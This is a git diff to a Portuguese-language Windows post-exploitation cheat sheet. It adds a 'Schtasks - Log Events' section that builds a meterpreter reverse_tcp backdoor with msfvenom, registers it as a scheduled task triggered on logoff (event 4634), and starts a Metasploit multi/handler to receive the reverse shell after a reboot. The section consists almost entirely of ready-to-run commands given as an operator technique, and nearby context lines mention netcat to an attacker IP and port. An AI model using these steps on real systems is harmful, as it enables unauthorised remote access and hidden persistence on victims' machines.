@@ -87,6 +87,8 @@ nc IP PORTA
 ### RDP
 ----------------------------------------------------------------------------------
 Já com o alvo explorado e com uma shell meterpreter:
+- 
+-
 
 
 ### Schtasks
@@ -97,7 +99,31 @@ Já com o alvo explorado e com uma shell meterpreter:
 ### Schtasks - Log Events
 ----------------------------------------------------------------------------------
 Já com o alvo explorado e com uma shell meterpreter:
-
+- Vamos iniciar criando um backdoor via msfvenom.
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
+```
+![Screenshot_1](https://user-images.githubusercontent.com/67444297/198754911-1b1001ce-e154-4982-8f9b-158cdc15d4e4.jpg)
+- No meterpreter, iniciaremos a shell e criaremos a task através do schtasks setando o nosso backdoor.
+```bash
+schtasks /Create /TN SessionOnLogOff /TR C:\Windows\System32\backdoor.exe /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"
+```
+![Screenshot_3](https://user-images.githubusercontent.com/67444297/198754915-d0c88527-cc5e-4c89-8a71-df76edbc8bc6.jpg)
+- Iniciaremos o multi/handler para receber a shell.
+```bash
+msfconsole -q
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4444
+ip a s
+set LHOST SEUIP
+exploit
+```
+![Screenshot_2](https://user-images.githubusercontent.com/67444297/198754914-cfa45c52-0dea-41f2-a8cf-a60855680d89.jpg)
+Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado e a task seja executada.
+![Screenshot_4](https://user-images.githubusercontent.com/67444297/198754918-e532b2a5-337c-48b7-a08c-7c61862dac6c.jpg)
+- Após o reboot, receberemos nossa shell.
+![Screenshot_5](https://user-images.githubusercontent.com/67444297/198754920-67ffe450-596a-4dfc-8736-8e5eed3ca16e.jpg)
 
 ### WMIC
 ----------------------------------------------------------------------------------
